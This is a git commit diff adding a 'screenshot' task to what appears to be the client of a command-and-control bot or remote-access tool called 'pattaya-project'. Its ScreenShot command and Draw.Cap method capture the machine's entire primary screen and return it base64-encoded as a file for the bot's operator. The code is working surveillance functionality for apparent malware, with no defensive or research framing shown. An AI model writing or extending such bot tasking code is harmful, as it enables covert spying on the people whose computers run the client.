74fda0850abf027d46d80a03ed7625f66a8c25d6
Anuwat <admin@unknownclub.net>
2023-05-02 23:32:19 +0700

    feat: add screenshot command

---
+++ pattaya-project-client/Commands/Implements/ScreenShot.cs
@@ -0,0 +1,27 @@
+﻿using pattaya_project_client.Commands.Interfaces;
+using pattaya_project_client.Models;
+using pattaya_project_client.Services;
+using System.IO;
+
+namespace pattaya_project_client.Commands.Implements
+{
+    public class ScreenShot : BotCommand
+    {
+        public override string TaskName => "screenshot";
+
+        public override BotTaskResult RunTask(BotTask task)
+        {
+            string fileName = Path.GetRandomFileName(); 
+            fileName = Path.ChangeExtension(fileName, ".png");
+            fileName = string.Concat("screen_", fileName);
+
+            return new BotTaskResult
+            {
+                TaskId = task.TaskId,
+                Result = $"Screenshoting... ",
+                RespondingFile = Draw.Cap(),
+                RespondingFilename = fileName
+            };
+        }
+    }
+}
---
+++ pattaya-project-client/Services/Draw.cs
@@ -0,0 +1,32 @@
+﻿
+using System;
+using System.Drawing;
+using System.IO;
+using System.Linq;
+using System.Windows.Forms;
+
+namespace pattaya_project_client.Services
+{
+    public class Draw
+    {
+        public static string Cap()
+        {
+
+            Bitmap screenCapture = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
+            using (Graphics graphics = Graphics.FromImage(screenCapture))
+            {
+                graphics.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, screenCapture.Size);
+            }
+
+            byte[] screenCaptureBytes;
+            using (MemoryStream memoryStream = new MemoryStream())
+            {
+                screenCapture.Save(memoryStream, System.Drawing.Imaging.ImageFormat.Png);
+                screenCaptureBytes = memoryStream.ToArray();
+            }
+            string screenCaptureBase64 = Convert.ToBase64String(screenCaptureBytes);
+
+            return screenCaptureBase64;
+        }
+    }
+}
